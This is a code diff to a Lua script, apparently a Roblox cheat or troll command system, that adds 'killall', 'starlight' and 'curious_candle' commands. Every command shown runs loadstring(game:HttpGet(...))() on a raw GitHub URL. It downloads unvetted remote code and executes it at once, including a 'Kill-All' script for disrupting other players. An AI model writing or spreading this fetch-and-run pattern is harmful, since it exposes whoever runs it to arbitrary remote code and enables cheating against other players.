@@ -25,7 +25,10 @@ local COMMANDS = {
     fart = true,
     superpower = true,
     troll = true,
-    freddy = true
+    freddy = true,
+    killall = true,
+    starlight = true,
+    curious_candle = true
 }
 
 local AllowedPlayers = {
@@ -97,6 +100,12 @@ local function ExecuteCommand(cmd, sender)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Audio/refs/heads/main/Troll-Face"))()
     elseif cmd == "freddy" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Audio/refs/heads/main/Freddy-ArArArAr"))()
+    elseif cmd == "killall" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/idkman60093/Doors-Modes/refs/heads/main/Kill-All"))()
+    elseif cmd == "starlight" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/StarJug.lua"))()
+    elseif cmd == "curious_candle" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/kodbolx/kodbolhub/refs/heads/main/curiouscandle.lua"))()
     end
 end
 
